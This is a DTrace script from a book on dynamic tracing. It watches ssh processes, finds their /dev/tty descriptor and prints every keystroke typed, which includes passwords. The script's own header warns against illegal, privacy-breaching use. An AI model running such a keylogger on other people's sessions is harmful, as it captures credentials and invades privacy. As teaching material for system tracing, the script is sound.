#!/usr/sbin/dtrace -s
/*
 * sshkeysnoop.d - A program to print keystroke details from ssh.
 *                 Written in DTrace (Solaris 10 build 63).
 *
 * Example script from Chapter 11 of the book: DTrace: Dynamic Tracing in
 * Oracle Solaris, Mac OS X, and FreeBSD", by Brendan Gregg and Jim Mauro,
 * Prentice Hall, 2011. ISBN-10: 0132091518. http://dtracebook.com.
 * 
 * See the book for the script description and warnings. Many of these are
 * provided as example solutions, and will need changes to work on your OS.
 *
 * WARNING: This is a demonstration program, please do not use this for
 * illegal purposes in your country such as breeching privacy.
 */

#pragma D option quiet

/*
 * Print header
 */
dtrace:::BEGIN
{
	/* print header */
	printf("%5s %5s %5s %5s  %s\n", "UID", "PID", "PPID", "TYPE", "TEXT");
}

/*
 * Print ssh execution
 */
syscall::exec*:return
/execname == "ssh"/
{
	/* print output line */
	printf("%5d %5d %5d %5s  %s\n\n", curpsinfo->pr_euid, pid,
	    curpsinfo->pr_ppid, "cmd", stringof(curpsinfo->pr_psargs));
}

/*
 * Determine which fd is /dev/tty
 */
syscall::open*:entry
/execname == "ssh"/
{
	self->path = arg0;
}

syscall::open*:return
/self->path && copyinstr(self->path) == "/dev/tty"/
{
	/* track this syscall */
	self->ok = 1;
}

syscall::open*:return { self->path = 0; }

syscall::open*:return
/self->ok/
{
	/* save fd number */
	self->fd = arg0;
}

/*
 * Print ssh keystrokes
 */
syscall::read*:entry
/execname == "ssh" && arg0 == self->fd/
{
	/* remember buffer address */
	self->buf = arg1;
}

syscall::read*:return
/self->buf != NULL && arg0 < 2/
{
	this->text = (char *)copyin(self->buf, arg0);

	/* print output line */
	printf("%5d %5d %5d %5s  %s\n", curpsinfo->pr_euid, pid,
	    curpsinfo->pr_ppid, "key", stringof(this->text));
	self->buf = NULL;
}
